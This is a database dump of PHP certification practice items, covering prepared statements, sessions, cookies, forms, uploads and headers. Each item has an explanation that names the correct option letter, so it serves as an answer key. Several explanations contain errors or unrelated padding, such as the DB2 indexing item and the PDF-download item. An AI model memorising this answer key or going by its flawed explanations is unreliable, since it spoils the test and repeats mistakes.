	(234,7,'&nbsp;You have been','','<p><span>&nbsp;Y</span><span>ou have been</span><span>&nbsp;given the following code snippet:</span></p>\r\n<p><span><pre><?php\r\n$stmt = $dbh->prepare(\"SELECT * FROM USER where name = ?\");\r\nif ($stmt->execute(array($_GET[\'name\']))) {\r\n  while (??????) {\r\n    print_r($row);\r\n  }\r\n}\r\n?> </pre></span></p>\r\n<p><span><span>What will you write at line number 4 to fetch data from database?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The following example explains the working of the fetch method:</span></p>\r\n<p><span><pre><?php\r\n$stmt = $dbh->prepare(\"SELECT * FROM USER where name = ?\");\r\nif ($stmt->execute(array($_GET[\'name\']))) {\r\n  while ($row = $stmt->fetch()) {\r\n    print_r($row);\r\n  }\r\n}\r\n?> </pre></span></p>\r\n<p><span><span>Answer options B, C, and D are incorrect. These are not valid formats for fetching data from prepared statements.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/mysqli.quickstart.prepared-statements.php\" tabindex=\"-1\">http://php.net/manual/en/mysqli.quickstart.prepared-statements.php</a></uc:ref></span></p>',0,'2012-11-24 15:24:18','2012-11-24 15:24:18'),
	(235,7,'Which of the following are the limitation.....s of the prepared statements?','','<p><span>Which of the following are the limitations of the prepared statements?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options B and C are correct.</span><br /><br /><span>The pros and cons of the prepared statements are as follows:</span><br /><br /><uc:hed>Pros:&nbsp;</uc:hed></p>\r\n<ul>\r\n<li>It prevents SQL injection without needing to escape data.</li>\r\n<li>It allows you to repeat the same statement without the overhead of parsing the SQL.</li>\r\n<li>It allows you to send raw binary data in packets.</li>\r\n<li>It creates code that is easier to read by separating SQL logic from data.</li>\r\n</ul>\r\n<p><uc:hed>Cons:&nbsp;</uc:hed></p>\r\n<ul>\r\n<li>It is slower for one time queries since it requires two requests from the MySQL server.</li>\r\n<li>It is limited to SELECT, INSERT, REPLACE, UPDATE, DELETE, and CREATE TABLE queries.</li>\r\n</ul>\r\n<p><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/mysqli.quickstart.prepared-statements.php\" tabindex=\"-1\">http://php.net/manual/en/mysqli.quickstart.prepared-statements.php</a></uc:ref></p>',0,'2012-11-24 15:25:08','2012-11-24 15:25:08'),
	(236,7,'You have a table created as follows:','','<p><span>You have a table created as follows:</span></p>\r\n<p><span><pre>create table foo (c1 int, c2 char(30), c3 int, c4 char(10)) </pre></span></p>\r\n<p><span><span>If column c1 is unique, which of the following indexes would optimize the statement given below?</span></span></p>\r\n<p><span><span><pre>Select distinct (c1), c3 from foo where c1=10</pre></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The optimal index has column C1 as unique, and includes column C3 using the statement</span></p>\r\n<p><span><pre>create unique index foox on foo (c1) include (c3)</pre></span></p>\r\n<p><span><span>Since the query has a predicate on column C1, that column should be part of the index. Since column C1 is unique, the index should be a unique index, to minimize any extra work required to enforce the DISTINCT clause on the query. By creating a unique index, the DISTINCT clause will not need to do a sort on that column. Therefore, the two non-unique indexes are not optimal.</span><br /><br /><span>Answer option C is incorrect. Since the query also returns column C2, if that is part of the index, DB2 need not access the table at all. The statement</span></span></p>\r\n<p><span><span><pre>create unique index foox on foo (c1,c3) </pre></span></span></p>\r\n<p><span><span><span>does not enforce uniqueness on C1, rather on the combination of C1 and C3, so this is not optimal.</span></span></span></p>',0,'2012-11-24 15:26:48','2012-11-24 15:26:48'),
	(237,7,'Which of the following recovers the commi.....t any kind of system failure?','','<p><span>Which of the following recovers the committed transaction updates against any kind of system failure?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>Durability recovers the committed transaction updates against any kind of system failure. It is guaranteed that once a user notified for successful transaction, the transaction will not be lost. The changes in transaction\'s data will survive system failure, and that all integrity constraints have been satisfied; therefore, there is no need to reverse the transaction. Many database systems implement durability by writing transactions into a transaction log that can be reprocessed to recreate the system state right before any later failure.</span><br /><br /><span>Answer option A is incorrect. Atomicity means the property of DBMS to guarantee that either all of the tasks in a given transaction are performed or none of those is performed. A transaction is an atomic unit of work. This means that in order to be in a transaction, a group of activities should succeed or all of them should fail. If a transaction is interrupted, all the previous steps within that transaction are undone.</span><br /><br /><span>Answer option B is incorrect. Consistency refers to the behavior of data after a transaction is completed. Whether a transaction commits or rolls back, it must leave the data in a consistent state. For example, when money is withdrawn from an ATM, the amount of money deducted from the balance must be equal to the money that the cardholder has received. If a transaction consisted of an attempt to delete a record referenced by another, each of the following mechanisms would maintain consistency:</span></p>\r\n<ol>\r\n<li>Abort the transaction, rolling back to the consistent, prior state;</li>\r\n<li>Delete all records that reference the deleted record; or, Remove the relevant fields in all records that point to the deleted record.</li>\r\n</ol>\r\n<p><span>Answer option C is incorrect. A transaction must be performed such that it is unaffected by any other part of the system. This means that the data a transaction accesses cannot be affected by any other part of the system until the transaction is completed. This property is directly related to the consistency property, as the violation of this property may leave data in an inconsistent state.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/pdo.transactions.php\" tabindex=\"-1\">http://www.php.net/manual/en/pdo.transactions.php</a></uc:ref></p>',0,'2012-11-24 15:27:35','2012-11-24 15:27:35'),
	(238,7,'Which of the following prepared query str.....execute a prepared statement?','','<p><span>Which of the following prepared query strings is used to execute a prepared statement?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>PDOStatement::execute is used to execute a prepared statement. PDO is a PHP extension for establishing PHP\'s database connections by creating a uniform interface. PDO is used to create code which is portable across many databases and platforms.</span><br /><br /><span>Answer option A is incorrect. PDOStatement::errorInfo is used to fetch extended error information associated with the last operation on the statement handle.</span><br /><br /><span>Answer option C is incorrect. PDOStatement::fetch is used to fetch the next row from a result set.</span><br /><br /><span>Answer option D is incorrect. PDOStatement::fetchAll returns an array containing all of the result set rows.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/class.pdo.php\" tabindex=\"-1\">http://www.php.net/manual/en/class.pdo.php</a></uc:ref></p>',0,'2012-11-24 15:28:24','2012-11-24 15:28:24'),
	(239,8,'You want to destroy session variables wit.....u use to accomplish the task?','','<p><span>You want to destroy session variables within a PHP session. Which of the following methods can you use to accomplish the task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The session_destroy() function is used to destroy all data associated with the current session. However, it does not unset any global variables associated with the session. It also does not unset the current session cookie. The syntax of the session_destroy() function is as follows:</span></p>\r\n<p><span><pre><?php\r\n   session_destroy();\r\n?></pre></span></p>\r\n<p><span><span>Answer option B is incorrect. The session_regenerate_id() function is used to replace the current session id with the new session id, and to keep information of the current session. This function is used as a countermeasure to a session fixation attack in which the attacker attempts to exploit the vulnerability of a system by fixating another person\'s session identifier (SID). The syntax of the session_regenerate_id() function is as follows:</span></span></p>\r\n<p><span><span><pre>bool session_regenerate_id  ([ bool $delete_old_session = false])</pre></span></span></p>\r\n<p><span><span><span>Answer options C and D are incorrect. These are not valid PHP functions.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in.php.net/manual/en/function.session-destroy.php\" tabindex=\"-1\">http://in.php.net/manual/en/function.session-destroy.php</a></uc:ref></span></span></p>',0,'2012-11-24 15:35:05','2012-11-24 15:35:05'),
	(240,8,'You allow PHP to dynamically choose wheth......ini directives will you use?','','<p><span>You allow PHP to dynamically choose whether to propagate the session identifier via cookies or the URL, depending on the user\'s preferences. Which of the following PHP.ini directives will you use?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The session.use_trans_sid PHP directive allows a user to choose dynamically whether to propagate the session identifier via cookies or the URL, depending on the user\'s preferences. If you have enabled cookies, PHP will use a cookie; otherwise, it will use the URL.</span><br /><br /><span>Answer option B is incorrect. The session.auto_start() PHP directive indicates whether or not PHP should always enable session management, allowing you to avoid the call to session_start().</span><br /><br /><span>Answer option C is incorrect. The session.use_cookies directive indicates whether or not PHP will use cookies to propagate the session identifier.</span><br /><br /><span>Answer option D is incorrect. The session.save_path directive indicates the directory in which PHP will store session data.</span></p>',0,'2012-11-24 15:36:00','2012-11-24 15:36:00'),
	(241,8,'The dl() function is used to load PHP ext.....rform to accomplish the task?','','<p><span>The dl() function is used to load PHP extensions on the server at runtime. However, you want to disable it due to some security issue. Which of the following actions will you perform to accomplish the task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and C are correct.</span><br /><br /><span>The dl() function is used to load PHP extensions on the server at runtime. However, it can be the cause of some security issue. To disable this function, you can perform the following actions:</span></p>\r\n<ol>\r\n<li>Set the enable_dl option to 0 in the php.ini file.</li>\r\n<li>Add the dl() function in the disable_functions list in the PHP.ini configuration file.</li>\r\n</ol>\r\n<p><span>Answer option D is incorrect. This action is used to enable the dl() function.</span><br /><br /><span>Answer option B is incorrect. This is not a valid option to accomplish the task.</span></p>',0,'2012-11-24 15:36:47','2012-11-24 15:36:47'),
	(242,8,'You want to enable compression in the PHP..... ways should you prefer most?','','<p><span>You want to enable compression in the PHP code output. Which of the following ways should you prefer most?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>A user can compress the output of the PHP code in two ways, which are as follows:</span><br /><br /></p>\r\n<ol>\r\n<li><uc:hed>By using the ob_start() function:</uc:hed>&nbsp;The ob_start() function enables the compression in PHP output. Placing this function at the top of a page invokes PHP\'s output buffering mechanism, and causes it to transparently compress the script\'s output.</li>\r\n<li><uc:hed>By setting zlib.output_compression to on in PHP.ini file:</uc:hed>&nbsp;A user can set zlib.output_compression to on to enable the output compression for always. This approach is the best approach since these settings can be turned on and off without affecting the code.</li>\r\n</ol>\r\n<p><span>Answer options C and D are incorrect. These are not valid options.</span></p>',0,'2012-11-24 15:37:35','2012-11-24 15:37:35'),
	(243,8,'You have been given the following PHP scr..... from the user in PHP?','','<p><span>You have been given the following PHP script:</span></p>\r\n<p><span><pre><?php\r\nif ($_POST) \r\n{\r\n   echo \'<pre>\';\r\n   echo htmlspecialchars(print_r($_POST, true));\r\n   echo \'</pre>\'; \r\n}\r\n?> \r\n<form action=\"action.php\" method=\"post\">\r\n   Name:  <input type=\"text\" name=\"personal[name]\" /><br />\r\n   Email: <input type=\"text\" name=\"personal[email]\" /><br />\r\n   Code: <br />\r\n   ?????????????????????????????\r\n   <option value=\"A\">A</option>\r\n   <option value=\"B\">B</option>\r\n   <option value=\"C\">C</option>\r\n   </select><br /> \r\n   <input type=\"submit\" value=\"submit me!\" />\r\n</form> </pre></span></p>\r\n<p><span><span>Which of the following is the correct syntax that should be used in line number 13 to capture all of the data from the user in PHP?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the form, if you are using the select tag, you should use the select tag name in the array datatype to capture all of the data from the user in PHP. Hence, the select tag syntax will be as follows:</span></p>\r\n<p><span><pre> <select multiple name=\"select_box[]\"></pre></span></p>\r\n<p><span><span>Answer options B, C, and D are incorrect. These are not valid solutions of the given question.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.w3schools.com/php/php_forms.asp\" tabindex=\"-1\">http://www.w3schools.com/php/php_forms.asp</a></uc:ref></span></p>',0,'2012-11-24 15:40:30','2012-11-24 15:40:30'),
	(244,8,'Consider the following PHP code snippet:','','<p><span>Consider the following PHP code snippet:</span></p>\r\n<p><span><pre><form method=get>\r\n    <select name = \"fruits\" id=\"fruits\">\r\n        <option value=\"1\">Apple</option>\r\n        <option>Orange</option>\r\n        <option value=\"3\">Strawberry</option>\r\n    </select>\r\n <input type=submit value=\"Submit\">\r\n <?php\r\n    echo $_GET[\'fruits\'];\r\n ?></pre></span></p>\r\n<p><span><span>What will be the output if you select \'Orange\' from the dropdown menu?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>If you do not give any value in the \"value\" attribute of the &lt;option&gt; tag, form submits the value written between the &lt;option&gt; &lt;/option&gt; tags of the &lt;select&gt; tag. Hence, the output of the code will be Orange.</span><br /><br /><span>Answer options A, B, and D are incorrect. These are not the valid output of the given script.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.w3schools.com/tags/tag_select.asp\" tabindex=\"-1\">http://www.w3schools.com/tags/tag_select.asp</a></uc:ref></p>',0,'2012-11-24 15:41:30','2012-11-24 15:41:30'),
	(245,8,'You have the following code in the welcom..... name as Maria?','','<p><span>You have the following code in the welcome.html file:</span></p>\r\n<p><span><pre><form action=\"welcome.php\" method=\"post\">\r\n    Your Name: <input type=\"text\" name=\"fname\" />\r\n    Your Girl Friend Name: <input type=\"text\" name=\"fname\" />\r\n    <input type=\"submit\" />\r\n </form></pre></span></p>\r\n<p><span><span>The PHP code of the welcome.php file is as follows:</span></span></p>\r\n<p><span><span><pre>Welcome <?php echo $_POST[\"fname\"];?> and <?php echo $_POST[\"fname\"];?>! </pre></span></span></p>\r\n<p><span><span><span>What will be the output if you give your name as John and your girlfriend\'s name as Maria?</span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>According to the scenario, the name of the both text buttons is the same, i.e.,&nbsp;</span><uc:stx>fname</uc:stx><span>. Since both inputs, i.e., John and Maria, will be passed by the same $_POST[\"fname\"] variable, the second input given by you will override the first input.</span></p>',0,'2012-11-24 15:43:09','2012-11-24 15:43:09'),
	(246,8,'&nbsp;In which of the following ways will.....do not know how data is sent?','','<p><span>&nbsp;In which of the following ways will you send data from a Web page if you do not know how data is sent?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>You can use the $_REQUEST[] super global variable to send data from a Web page if you do not know how data is sent. The $_REQUEST[] is an associative array that by default contains the contents of $_GET, $_POST and $_COOKIE information. Supergobal variables are built in arrays in PHP, which are available in any scope. A user can access a superglobal array within a function or method without using the global keyword. There are following superglobal arrays in PHP:</span></p>\r\n<table border=\"1\">\r\n<tbody>\r\n<tr><th>Arrays</th><th>Description</th></tr>\r\n<tr>\r\n<td>$_COOKIE</td>\r\n<td>It contains keys and values set as browser cookies.</td>\r\n</tr>\r\n<tr>\r\n<td>$_ENV</td>\r\n<td>It contains keys and values set by the script\'s shell context.</td>\r\n</tr>\r\n<tr>\r\n<td>$_FILES</td>\r\n<td>It contains information about uploaded files.</td>\r\n</tr>\r\n<tr>\r\n<td>$_GET</td>\r\n<td>It contains keys and values submitted to the script using the HTTP get method.</td>\r\n</tr>\r\n<tr>\r\n<td>$_POST</td>\r\n<td>It contains keys and values submitted to the script using the HTTP post method.</td>\r\n</tr>\r\n<tr>\r\n<td>$_REQUEST</td>\r\n<td>It contains a combined array containing values from the $_GET, $_POST, and $_COOKIES superglobal arrays.</td>\r\n</tr>\r\n<tr>\r\n<td>$GLOBALS</td>\r\n<td>It contains all global variables associated with the current script.</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><br /><span>Answer option B is incorrect. The $_GET[] super global array contains keys and values submitted to the script using the HTTP get method.</span><br /><br /><span>Answer option A is incorrect. The $_POST[] super global array contains keys and values submitted to the script using the HTTP post method.</span><br /><br /><span>Answer option D is incorrect. This is not a valid PHP method.&nbsp;</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/reserved.variables.request.php\" tabindex=\"-1\">http://php.net/manual/en/reserved.variables.request.php</a></uc:ref></p>',0,'2012-11-24 15:44:27','2012-11-24 15:44:27'),
	(247,8,'Which of the following HTML code snippets..... used for the file uploading?','','<p><span>Which of the following HTML code snippets can be used for the file uploading?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In most cases, a user does not need to use any enctype attribute. The reason behind this is that the default value (even enctype is not given in the form) is \"application/x-www-form-urlencoded\", which is sufficient for almost any kind of form data. However, the default enctype value cannot be used for file uploading. For file uploading, a user must use the \"multi-part\" HTTP POST method. The syntax of the example form is as follows:</span></p>\r\n<p><span><pre><form enctype=\"multipart/form-data\" action=\"index.php\" method=\"post\">\r\n   <input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"50000? />\r\n   <input name=\"filedata\" type=\"file\" />\r\n   <input type=\"submit\" value=\"Send file\" />\r\n </form></pre></span></p>\r\n<p><span><span>Answer option B is incorrect. In this form format, form is encoded by certain rules.&nbsp;</span><br /><br /><span>Answer option C is incorrect. In this form format, data is sent in the plain text format and any type of encoding is not done.</span><br /><br /><span>Answer option D is incorrect. This is not a valid form format.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/features.file-upload.php\" tabindex=\"-1\">http://php.net/manual/en/features.file-upload.php</a></uc:ref></span></p>',0,'2012-11-24 15:47:19','2012-11-24 15:47:19'),
	(248,8,'What is the maximum limit of the file siz.....>\r\n','','<p><span>What is the maximum limit of the file size that a user can upload according to the code snippet given below?</span></p>\r\n<p><span><pre><form enctype=\"multipart/form-data\" action=\"index.php\" method=\"post\">\r\n   <input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"5000\" />\r\n   <input name=\"filedata\" type=\"file\" />\r\n   <input type=\"submit\" value=\"Send file\" />\r\n </form></pre></span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Here, the user can upload a file of size 5,000 bytes. The MAX_FILE_SIZE value in HTML form is used to define the maximum file size allowed. Since this restriction is on the client side, an attacker can easily set this parameter to an arbitrary value.</span><br /><br /><span>You can limit the filesize uploaded by a POST method by modifying a number of configuration directives in the PHP.ini file, such as post_max_size, max_input_time and upload_max_filesize.</span><br /><br /><span>Answer options B, C, and D are incorrect. These are not the valid answers according to the given question.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/features.file-upload.php\" tabindex=\"-1\">http://php.net/manual/en/features.file-upload.php</a></uc:ref></p>',0,'2012-11-24 15:48:38','2012-11-24 15:48:38'),
	(249,8,'Which of the following is an associative .....ipt via the HTTP POST method?','','<p><span>Which of the following is an associative array of items uploaded by the current PHP script via the HTTP POST method?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The $_FILES is a super global associative array of items uploaded by the current PHP script via the HTTP POST method. Supergobal variables are built in arrays in PHP, which are available in any scope. A user can access a superglobal array within a function or method without using the global keyword. There are following superglobal arrays in PHP:</span></p>\r\n<table border=\"1\">\r\n<tbody>\r\n<tr><th>Arrays</th><th>Description</th></tr>\r\n<tr>\r\n<td>$_COOKIE</td>\r\n<td>It contains keys and values set as browser cookies.</td>\r\n</tr>\r\n<tr>\r\n<td>$_ENV</td>\r\n<td>It contains keys and values set by the script\'s shell context.</td>\r\n</tr>\r\n<tr>\r\n<td>$_FILES</td>\r\n<td>It contains information about uploaded files.</td>\r\n</tr>\r\n<tr>\r\n<td>$_GET</td>\r\n<td>It contains keys and values submitted to the script using the HTTP get method.</td>\r\n</tr>\r\n<tr>\r\n<td>$_POST</td>\r\n<td>It contains keys and values submitted to the script using the HTTP post method.</td>\r\n</tr>\r\n<tr>\r\n<td>$_REQUEST</td>\r\n<td>It contains a combined array containing values from the $_GET, $_POST, and $_COOKIES superglobal arrays.</td>\r\n</tr>\r\n<tr>\r\n<td>$GLOBALS</td>\r\n<td>It contains all global variables associated with the current script.</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><span>Answer options B, C, and D are incorrect. $_REQUEST, $_ENV, and $_COOKIE does not provide the information about uploaded file.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/reserved.variables.files.php\" tabindex=\"-1\">http://php.net/manual/en/reserved.variables.files.php</a></uc:ref></p>',0,'2012-11-24 15:52:08','2012-11-24 15:52:08'),
	(250,8,'Which of the following statements is true.....t deleting a client\'s cookie?','','<p><span>Which of the following statements is true about deleting a client\'s cookie?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>You cannot remove a cookie from a client computer. You have to set the cookie time in the past to make it expire. For example, in order to make a cookie expire, you can set the expiration time to one hour ago:</span></p>\r\n<p><span><pre><?php\r\nsetcookie(\"user\", \"\", time()-3600);\r\n?></pre></span></p>',0,'2012-11-24 15:53:26','2012-11-24 15:53:26'),
	(251,8,'You want to make a cookie available only .....d you use to accomplish this?','','<p><span>You want to make a cookie available only for the HTTP protocol. Which of the following set_cookie() parameters would you use to accomplish this?</span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option A is correct.<br /><br />The httponly option can be used to make a cookie available only for the HTTP protocol.&nbsp;<br /><br />Answer options B and C are incorrect. The secure option is used when the cookie can be transferred only via the HTTPS protocol; the expire=DATE option is used to set the expiry date of the cookie.&nbsp;<br /><br />Answer option D is incorrect. None is not a valid set_cookie() function parameter.</div>',0,'2012-11-24 15:54:14','2012-11-24 15:54:14'),
	(252,8,'Which of the following superglobals can y.....ookie from the client\'s side?','','<p><span>Which of the following superglobals can you use to fetch a cookie from the client\'s side?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>You can either use $_COOKIE or $_REQUEST superglobals to fetch a cookie from the client\'s side. The $_REQUEST array can be used to fetch get, post, and cookie all three types of data.</span><br /><br /><span>Answer options C and D are incorrect. $_GET and $_POST are superglobal arrays used to retrieve, get, and post data respectively.</span></p>',0,'2012-11-24 15:55:14','2012-11-24 15:55:14'),
	(253,8,'You have been given the following code sn.....print the XML content?','','<p><span>You have been given the following code snippet:</span></p>\r\n<p><span><pre><?php\r\n $string = <<<XML\r\n <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> \r\n <email> \r\n <to>jenny@php.com</to> \r\n <from>john@php.com</from> \r\n <heading>Technical issue in Linux OS</heading> \r\n <body>There is a technical issue in my Linux system. Please Fix it. </body>\r\n </email> \r\n XML;\r\n \r\n <Write code here> \r\n?> </pre></span></p>\r\n<p><span><span>Which of the following code snippets will you write to print the XML content?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The simplexml_load_string() function is used to interpret a string of XML into an object. The syntax of the simplexml_load_string() function is as follows:</span><br /><br /><uc:stx>object simplexml_load_string ( string $data [, string $class_name = \"SimpleXMLElement\" [, int $options = 0 [, string $ns [, bool $is_prefix = false ]]]] )</uc:stx></p>',0,'2012-11-24 15:56:52','2012-11-24 15:56:52'),
	(254,8,'What is the work of simplexml_import_dom(.....  echo $xml->from;\r\n?> ','','<p><span>What is the work of simplexml_import_dom() in the following PHP code?</span></p>\r\n<p><span><pre><?php\r\n $dom = new domDocument;\r\n $dom->loadXML(\'<email><from>John</from></email>\');\r\n  $xml = simplexml_import_dom($dom);\r\n  echo $xml->from;\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>simplexml_import_dom() is used to convert a DOM node to a SimpleXMLElement object. It gets a SimpleXMLElement object from a DOM node. For example, the following PHP code snippet is given:</span></p>\r\n<p><span><pre><?php\r\n$dom = new domDocument;\r\n$dom->loadXML(\'<email><from>John</from></email>\');\r\n \r\n$xml = simplexml_import_dom($dom);\r\n \r\necho $xml->from;\r\n?> </pre></span></p>\r\n<p><span><span>The output of this code will be&nbsp;</span><uc:stx>John</uc:stx><span>. Here, simplexml_import_dom() is getting a SimpleXMLElement object from a DOM node.</span></span></p>',0,'2012-11-24 15:58:17','2012-11-24 15:58:17'),
	(255,8,'You want to enable compression for every .....u set to accomplish the task?','','<p><span>You want to enable compression for every Web page of your Website. Which of the following PHP.ini directives can you set to accomplish the task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>If you want to enable compression for every Web page of your Website, you should change the following configuration directives in your php.ini file:</span></p>\r\n<p><span><pre> zlib.output_compression = on\r\n zlib.output_compression_level = 9</pre></span></p>\r\n<p><span><span>Since you can change these settings and turn them on or off without changing your code, it is best way of implementing compression within your application.</span><br /><br /><span>Answer options C and D are incorrect. These are not valid options.</span></span></p>',0,'2012-11-24 15:59:28','2012-11-24 15:59:28'),
	(256,8,'Which of the following statements correct.....p://www.google.com\" ); ','','<p><span>Which of the following statements correctly explains the working of the following code snippet?</span></p>\r\n<p><span><pre>header( \"Location: http://www.google.com\" ); </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The header() function is used to send a raw HTTP header to a client. A user should call the header() function before any actual output is sent, either by normal HTML tags, blank lines in a file, or from PHP. By sending a \"Location\" header instead of PHP\'s default, a user can cause the browser to be redirected to a new page. For example, if a Web developer wants to redirect the user to the google main page on reaching his affiliate page, he will use the following code snippet in the PHP script:</span></p>\r\n<p><span><pre>header(\"Location: http://www.google.com\" );</pre></span></p>\r\n<p><span><span>Answer options B, C, and D are incorrect. The header() function is not used to perform these tasks.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.header.php\" tabindex=\"-1\">http://php.net/manual/en/function.header.php</a></uc:ref></span></p>',0,'2012-11-24 16:15:58','2012-11-24 16:15:58'),
	(257,8,'You want to send an HTTP cookie without U.....owing functions will you use?','','<p><span>You want to send an HTTP cookie without URL encoding the cookie value. Which of the following functions will you use?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The setrawcookie() function is used to send an HTTP cookie without URL encoding the cookie value.</span><br /><br /><span>Answer option B is incorrect. The setcookie() function sends an HTTP cookie to a client.</span><br /><br /><span>Answer option C is incorrect. The headers_sent() function checks if / where the HTTP headers have been sent.</span><br /><br /><span>Answer option D is incorrect. The header_list() function returns a list of response headers sent (or ready to send).</span></p>',0,'2012-11-24 16:20:25','2012-11-24 16:20:25'),
	(258,8,'Which of the following code snippets will.....ers from one page to another?','','<p><span>Which of the following code snippets will you use to redirect your users from one page to another?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>A programmer can redirect users from an opened page to another page by using headers. To do this, he needs to use the Location header:</span></p>\r\n<p><span><pre>header(\"Location: http://php.com\");</pre></span></p>\r\n<p><span><span>The programmer can use the exit() function to ensure that portions of the script are not called unexpectedly:</span></span></p>\r\n<p><span><span><pre>header(\"Location: http://php.com\");\r\nexit();</pre></span></span></p>\r\n<p><span><span><span>Answer options B, C, and D are incorrect. These are not valid syntaxes of header redirect.</span></span></span></p>',0,'2012-11-24 16:22:36','2012-11-24 16:22:36'),
	(259,8,'Consider the following PHP script:.....of the downloaded pdf?','','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n      header(\"Content-type:application/pdf\");\r\n      header(\"Content-Disposition:attachment;filename=\'2.pdf\'\");\r\n      readfile(\"1.pdf\");\r\n ?></pre></span></p>\r\n<p><span><span>What will be the default name of the downloaded pdf?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The header() function is used to send a raw HTTP header to a client. A user should call the header() function before any actual output is sent, either by normal HTML tags, blank lines in a file, or from PHP. By sending a \"Location\" header instead of PHP\'s default, a user can cause the browser to be redirected to a new page. For example, if a Web developer wants to redirect the user to the php main page on reaching his affiliate page, he will use the following code snippet in the PHP script:</span></p>\r\n<p><span><pre>header(\"Location: http://www.php.com\" );</pre></span></p>\r\n<p><span><span>In the above question, the user will be prompted to save a PDF file. Here, the Content-Disposition argument of the header function will supply a recommended filename and force the browser to display the save dialog box.</span></span></p>\r\n<p><span><span><pre><?php\r\n   header(\"Content-type:application/pdf\");\r\n   // It will be called 2.pdf\r\n   header(\"Content-Disposition:attachment;filename=\'2.pdf\'\");\r\n   //original file is 1.pdf\r\n   readfile(\"1.pdf\");\r\n ?> </pre></span></span></p>\r\n<p><span><span><span>Answer options A, C, and D are incorrect. You will not get these outputs from the given script in the question.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.w3schools.com/php/func_http_header.asp\" tabindex=\"-1\">http://www.w3schools.com/php/func_http_header.asp</a></uc:ref></span></span></p>',0,'2012-11-24 16:24:53','2012-11-24 16:24:53'),
	(260,8,'&nbsp;What will be the output of the foll.....y(1,2,3),array(4,5,6));','','<p><span>&nbsp;What will be the output of the following PHP code?</span></p>\r\n<p><span><pre>array_combine(array(1,2,3),array(4,5,6));</pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The array_combine() function is used to combine two arrays. It uses the first array as the key and second array as a value. For example,&nbsp;</span><br /><br /><span>You want to run the following PHP code:</span></p>\r\n<p><span><pre>array_combine(array(1,2,3),array(4,5,6));</pre></span></p>\r\n<p><span><span>Here, the array_combine() function creates an array by using one array for keys and another for its values and gives the following array as an output:</span></span></p>\r\n<p><span><span><pre>array(1=>4,2=>5,3=>6)</pre></span></span></p>\r\n<p><span><span><uc:hed>Note:&nbsp;</uc:hed><span>Both parameters of the array_combine() function should have equal number of elements, otherwise it produces a warning message.</span><br /><br /><span>Answer options A, C, and D are incorrect. These are not valid outputs.</span></span></span></p>',0,'2012-11-24 16:27:08','2012-11-24 16:27:08'),
